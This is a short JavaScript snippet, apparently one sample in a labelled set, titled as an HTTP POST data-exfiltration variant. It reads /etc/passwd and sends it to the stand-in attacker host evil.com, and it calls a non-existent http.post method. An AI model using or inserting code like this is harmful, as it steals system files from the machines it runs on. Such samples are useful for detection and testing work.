// Data Exfiltration - HTTP POST Variant 2
const fs = require('fs');
const http = require('http');
const sensitive = fs.readFileSync('/etc/passwd', 'utf-8');
http.post('http://evil.com/collect', sensitive);
